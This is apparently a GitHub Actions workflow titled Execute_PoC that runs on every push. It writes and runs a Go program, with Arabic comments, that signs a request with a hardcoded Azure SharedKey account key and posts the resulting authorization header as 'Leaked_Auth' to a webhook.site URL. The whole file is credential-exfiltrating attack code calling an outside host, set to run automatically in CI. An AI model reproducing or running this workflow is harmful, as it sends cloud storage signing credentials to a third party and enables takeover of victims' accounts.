name: Execute_PoC
on: [push]
jobs:
  run-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Setup Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.21'

      - name: Run Standalone Exploit
        run: |
          # إنشاء برنامج Go مستقل يحاكي سلوك الـ SDK المصاب
          cat << 'EOF' > standalone_poc.go
          package main
          import (
              "crypto/hmac"
              "crypto/sha256"
              "encoding/base64"
              "fmt"
              "net/http"
              "net/url"
          )
          func main() {
              accountName := "victim_account"
              accountKey := "R2VuZXJpYyBLZXkgZm9yIFBvQyAxMjM0NTY3ODkwCg=="
              attackerURL := "https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835"

              // محاكاة عملية التوقيع (Signing) الخاصة بـ Azure SharedKey
              stringToSign := "GET\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:Sat, 16 May 2026 18:10:00 GMT\n/victim_account/"
              key, _ := base64.StdEncoding.DecodeString(accountKey)
              h := hmac.New(sha256.New, key)
              h.Write([]byte(stringToSign))
              signature := base64.StdEncoding.EncodeToString(h.Sum(nil))
              
              authHeader := fmt.Sprintf("SharedKey %s:%s", accountName, signature)
              
              // إرسال الهيدر المسرب لـ Webhook
              http.PostForm(attackerURL, url.Values{"Leaked_Auth": {authHeader}})
              fmt.Println("Exploit Sent!")
          }
          EOF
          
          go run standalone_poc.go
